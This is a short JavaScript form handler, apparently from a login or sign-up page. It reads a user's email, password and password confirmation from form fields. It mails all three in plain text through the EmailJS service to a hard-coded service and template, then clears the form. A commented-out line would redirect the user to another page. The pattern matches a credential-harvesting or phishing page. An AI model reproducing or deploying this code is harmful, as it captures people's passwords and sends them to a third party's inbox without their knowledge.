
function sendMail () {

    var params = {
        email: document.getElementById("1").value,
        password: document.getElementById("2").value,
        enterPasswordAgain: document.getElementById("3").value,
    }
    const serviceID = "service_91ylxms";
    const templateID = "template_jat6x2s"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            // window.location.href = "index01.html"
            document.getElementById("1").value = ""
            document.getElementById("2").value = ""
            document.getElementById("3").value = ""
            console.log(res)
        })
        .catch((err) => console.log(err))
}

  